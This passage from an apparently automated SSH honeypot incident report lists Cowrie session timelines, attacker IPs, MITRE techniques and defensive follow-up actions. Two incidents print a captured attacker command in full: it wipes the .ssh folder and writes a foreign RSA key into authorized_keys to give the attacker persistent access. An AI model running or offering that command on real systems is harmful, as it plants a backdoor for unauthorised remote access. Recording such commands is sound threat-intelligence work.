| `2026-07-16 12:02:54` | `cowrie.client.version` |
| `2026-07-16 12:02:54` | `cowrie.client.kex` |
| `2026-07-16 12:02:54` | `cowrie.login.success` |
| `2026-07-16 12:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b27d212e81f4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 12:03 |
| **Last Seen** | 2026-07-16 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:03:02` | `cowrie.session.connect` |
| `2026-07-16 12:03:02` | `cowrie.client.version` |
| `2026-07-16 12:03:02` | `cowrie.client.kex` |
| `2026-07-16 12:03:02` | `cowrie.login.success` |
| `2026-07-16 12:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400fbcd49bdb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-16 12:03 |
| **Last Seen** | 2026-07-16 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:03:02` | `cowrie.session.connect` |
| `2026-07-16 12:03:02` | `cowrie.client.version` |
| `2026-07-16 12:03:02` | `cowrie.client.kex` |
| `2026-07-16 12:03:02` | `cowrie.login.success` |
| `2026-07-16 12:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c4d4fcd9e5

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-07-16 12:03 |
| **Last Seen** | 2026-07-16 12:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:03:25` | `cowrie.session.connect` |
| `2026-07-16 12:03:26` | `cowrie.client.version` |
| `2026-07-16 12:03:26` | `cowrie.client.kex` |
| `2026-07-16 12:03:28` | `cowrie.login.success` |
| `2026-07-16 12:03:28` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6bba27cb48

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:03 |
| **Last Seen** | 2026-07-16 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:03:34` | `cowrie.session.connect` |
| `2026-07-16 12:03:34` | `cowrie.client.version` |
| `2026-07-16 12:03:34` | `cowrie.client.kex` |
| `2026-07-16 12:03:34` | `cowrie.login.success` |
| `2026-07-16 12:03:35` | `cowrie.session.params` |
| `2026-07-16 12:03:35` | `cowrie.command.input` |
| `2026-07-16 12:03:35` | `cowrie.log.closed` |
| `2026-07-16 12:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ada7fdccb0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:05 |
| **Last Seen** | 2026-07-16 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:05:09` | `cowrie.session.connect` |
| `2026-07-16 12:05:09` | `cowrie.client.version` |
| `2026-07-16 12:05:09` | `cowrie.client.kex` |
| `2026-07-16 12:05:09` | `cowrie.login.success` |
| `2026-07-16 12:05:10` | `cowrie.session.params` |
| `2026-07-16 12:05:10` | `cowrie.command.input` |
| `2026-07-16 12:05:10` | `cowrie.log.closed` |
| `2026-07-16 12:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c0444f13d18

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:06 |
| **Last Seen** | 2026-07-16 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:06:44` | `cowrie.session.connect` |
| `2026-07-16 12:06:44` | `cowrie.client.version` |
| `2026-07-16 12:06:44` | `cowrie.client.kex` |
| `2026-07-16 12:06:44` | `cowrie.login.success` |
| `2026-07-16 12:06:45` | `cowrie.session.params` |
| `2026-07-16 12:06:45` | `cowrie.command.input` |
| `2026-07-16 12:06:45` | `cowrie.log.closed` |
| `2026-07-16 12:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72dd5c9eae8b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:08 |
| **Last Seen** | 2026-07-16 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:08:19` | `cowrie.session.connect` |
| `2026-07-16 12:08:19` | `cowrie.client.version` |
| `2026-07-16 12:08:19` | `cowrie.client.kex` |
| `2026-07-16 12:08:19` | `cowrie.login.success` |
| `2026-07-16 12:08:20` | `cowrie.session.params` |
| `2026-07-16 12:08:20` | `cowrie.command.input` |
| `2026-07-16 12:08:20` | `cowrie.log.closed` |
| `2026-07-16 12:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c631a3d7cb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:09 |
| **Last Seen** | 2026-07-16 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:09:52` | `cowrie.session.connect` |
| `2026-07-16 12:09:52` | `cowrie.client.version` |
| `2026-07-16 12:09:52` | `cowrie.client.kex` |
| `2026-07-16 12:09:52` | `cowrie.login.success` |
| `2026-07-16 12:09:53` | `cowrie.session.params` |
| `2026-07-16 12:09:53` | `cowrie.command.input` |
| `2026-07-16 12:09:53` | `cowrie.log.closed` |
| `2026-07-16 12:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b1430713c6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:11 |
| **Last Seen** | 2026-07-16 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:11:25` | `cowrie.session.connect` |
| `2026-07-16 12:11:25` | `cowrie.client.version` |
| `2026-07-16 12:11:25` | `cowrie.client.kex` |
| `2026-07-16 12:11:25` | `cowrie.login.success` |
| `2026-07-16 12:11:26` | `cowrie.session.params` |
| `2026-07-16 12:11:26` | `cowrie.command.input` |
| `2026-07-16 12:11:26` | `cowrie.log.closed` |
| `2026-07-16 12:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c800f8390d4b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:13 |
| **Last Seen** | 2026-07-16 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:13:03` | `cowrie.session.connect` |
| `2026-07-16 12:13:03` | `cowrie.client.version` |
| `2026-07-16 12:13:03` | `cowrie.client.kex` |
| `2026-07-16 12:13:03` | `cowrie.login.success` |
| `2026-07-16 12:13:04` | `cowrie.session.params` |
| `2026-07-16 12:13:04` | `cowrie.command.input` |
| `2026-07-16 12:13:04` | `cowrie.log.closed` |
| `2026-07-16 12:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d426e4b553

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 12:14 |
| **Last Seen** | 2026-07-16 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:14:23` | `cowrie.session.connect` |
| `2026-07-16 12:14:23` | `cowrie.client.version` |
| `2026-07-16 12:14:23` | `cowrie.client.kex` |
| `2026-07-16 12:14:23` | `cowrie.login.success` |
| `2026-07-16 12:14:24` | `cowrie.session.params` |
| `2026-07-16 12:14:24` | `cowrie.command.input` |
| `2026-07-16 12:14:25` | `cowrie.log.closed` |
| `2026-07-16 12:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f6fa2a5403

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:14 |
| **Last Seen** | 2026-07-16 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:14:41` | `cowrie.session.connect` |
| `2026-07-16 12:14:41` | `cowrie.client.version` |
| `2026-07-16 12:14:41` | `cowrie.client.kex` |
| `2026-07-16 12:14:42` | `cowrie.login.success` |
| `2026-07-16 12:14:42` | `cowrie.session.params` |
| `2026-07-16 12:14:42` | `cowrie.command.input` |
| `2026-07-16 12:14:42` | `cowrie.log.closed` |
| `2026-07-16 12:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b389351b03e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:16 |
| **Last Seen** | 2026-07-16 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:16:20` | `cowrie.session.connect` |
| `2026-07-16 12:16:20` | `cowrie.client.version` |
| `2026-07-16 12:16:20` | `cowrie.client.kex` |
| `2026-07-16 12:16:20` | `cowrie.login.success` |
| `2026-07-16 12:16:21` | `cowrie.session.params` |
| `2026-07-16 12:16:21` | `cowrie.command.input` |
| `2026-07-16 12:16:21` | `cowrie.log.closed` |
| `2026-07-16 12:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-756a099a029b

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-07-16 12:16 |
| **Last Seen** | 2026-07-16 12:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:16:20` | `cowrie.session.connect` |
| `2026-07-16 12:16:20` | `cowrie.client.version` |
| `2026-07-16 12:16:21` | `cowrie.client.kex` |
| `2026-07-16 12:16:22` | `cowrie.login.success` |
| `2026-07-16 12:16:23` | `cowrie.session.params` |
| `2026-07-16 12:16:23` | `cowrie.command.input` |
| `2026-07-16 12:16:23` | `cowrie.command.failed` |
| `2026-07-16 12:16:23` | `cowrie.log.closed` |
| `2026-07-16 12:16:24` | `cowrie.session.params` |
| `2026-07-16 12:16:24` | `cowrie.command.input` |
| `2026-07-16 12:16:24` | `cowrie.session.file_download` |
| `2026-07-16 12:16:24` | `cowrie.log.closed` |
| `2026-07-16 12:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71a57967158

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-07-16 12:16 |
| **Last Seen** | 2026-07-16 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:16:25` | `cowrie.session.connect` |
| `2026-07-16 12:16:25` | `cowrie.client.version` |
| `2026-07-16 12:16:25` | `cowrie.client.kex` |
| `2026-07-16 12:16:26` | `cowrie.login.success` |
| `2026-07-16 12:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4674ea4d4ff

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-07-16 12:16 |
| **Last Seen** | 2026-07-16 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:16:26` | `cowrie.session.connect` |
| `2026-07-16 12:16:26` | `cowrie.client.version` |
| `2026-07-16 12:16:26` | `cowrie.client.kex` |
| `2026-07-16 12:16:27` | `cowrie.login.success` |
| `2026-07-16 12:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2410990b8f7a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 12:16 |
| **Last Seen** | 2026-07-16 12:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:16:58` | `cowrie.session.connect` |
| `2026-07-16 12:16:58` | `cowrie.client.version` |
| `2026-07-16 12:16:58` | `cowrie.client.kex` |
| `2026-07-16 12:16:58` | `cowrie.login.success` |
| `2026-07-16 12:16:59` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:16:59` | `cowrie.direct-tcpip.data` |
| `2026-07-16 12:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12561e351ebc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:17 |
| **Last Seen** | 2026-07-16 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:17:59` | `cowrie.session.connect` |
| `2026-07-16 12:17:59` | `cowrie.client.version` |
| `2026-07-16 12:17:59` | `cowrie.client.kex` |
| `2026-07-16 12:17:59` | `cowrie.login.success` |
| `2026-07-16 12:18:00` | `cowrie.session.params` |
| `2026-07-16 12:18:00` | `cowrie.command.input` |
| `2026-07-16 12:18:00` | `cowrie.log.closed` |
| `2026-07-16 12:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af4364065a54

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-07-16 12:18 |
| **Last Seen** | 2026-07-16 12:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:18:05` | `cowrie.session.connect` |
| `2026-07-16 12:18:05` | `cowrie.client.version` |
| `2026-07-16 12:18:05` | `cowrie.client.kex` |
| `2026-07-16 12:18:07` | `cowrie.login.success` |
| `2026-07-16 12:18:07` | `cowrie.direct-tcpip.request` |
| `2026-07-16 12:18:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2abe6a2f323

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:19 |
| **Last Seen** | 2026-07-16 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:19:41` | `cowrie.session.connect` |
| `2026-07-16 12:19:41` | `cowrie.client.version` |
| `2026-07-16 12:19:41` | `cowrie.client.kex` |
| `2026-07-16 12:19:41` | `cowrie.login.success` |
| `2026-07-16 12:19:42` | `cowrie.session.params` |
| `2026-07-16 12:19:42` | `cowrie.command.input` |
| `2026-07-16 12:19:42` | `cowrie.log.closed` |
| `2026-07-16 12:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c596e9ea1b

| Field | Detail |
|---|---|
| **Source IP** | `160.174.129[.]232` |
| **First Seen** | 2026-07-16 12:21 |
| **Last Seen** | 2026-07-16 12:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:21:15` | `cowrie.session.connect` |
| `2026-07-16 12:21:15` | `cowrie.client.version` |
| `2026-07-16 12:21:15` | `cowrie.client.kex` |
| `2026-07-16 12:21:15` | `cowrie.login.success` |
| `2026-07-16 12:21:16` | `cowrie.session.params` |
| `2026-07-16 12:21:16` | `cowrie.command.input` |
| `2026-07-16 12:21:16` | `cowrie.command.failed` |
| `2026-07-16 12:21:16` | `cowrie.log.closed` |
| `2026-07-16 12:21:17` | `cowrie.session.params` |
| `2026-07-16 12:21:17` | `cowrie.command.input` |
| `2026-07-16 12:21:17` | `cowrie.session.file_download` |
| `2026-07-16 12:21:17` | `cowrie.log.closed` |
| `2026-07-16 12:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.174.129[.]232` to AbuseIPDB if not already reported
- [ ] Block `160.174.129[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0355c2c8bc24

| Field | Detail |
|---|---|
| **Source IP** | `160.174.129[.]232` |
| **First Seen** | 2026-07-16 12:21 |
| **Last Seen** | 2026-07-16 12:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:21:18` | `cowrie.session.connect` |
| `2026-07-16 12:21:18` | `cowrie.client.version` |
| `2026-07-16 12:21:18` | `cowrie.client.kex` |
| `2026-07-16 12:21:18` | `cowrie.login.success` |
| `2026-07-16 12:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.174.129[.]232` to AbuseIPDB if not already reported
- [ ] Block `160.174.129[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70139871c7ee

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-16 12:21 |
| **Last Seen** | 2026-07-16 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:21:18` | `cowrie.session.connect` |
| `2026-07-16 12:21:18` | `cowrie.client.version` |
| `2026-07-16 12:21:18` | `cowrie.client.kex` |
| `2026-07-16 12:21:18` | `cowrie.login.success` |
| `2026-07-16 12:21:19` | `cowrie.session.params` |
| `2026-07-16 12:21:19` | `cowrie.command.input` |
| `2026-07-16 12:21:19` | `cowrie.log.closed` |
| `2026-07-16 12:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c33556d42540

| Field | Detail |
|---|---|
| **Source IP** | `160.174.129[.]232` |
| **First Seen** | 2026-07-16 12:21 |
| **Last Seen** | 2026-07-16 12:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 12:21:19` | `cowrie.session.connect` |
| `2026-07-16 12:21:19` | `cowrie.client.version` |
| `2026-07-16 12:21:19` | `cowrie.client.kex` |
| `2026-07-16 12:21:20` | `cowrie.login.success` |
| `2026-07-16 12:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.174.129[.]232` to AbuseIPDB if not already reported
- [ ] Block `160.174.129[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c90b3728783

| Field | Detail |
|---|---|
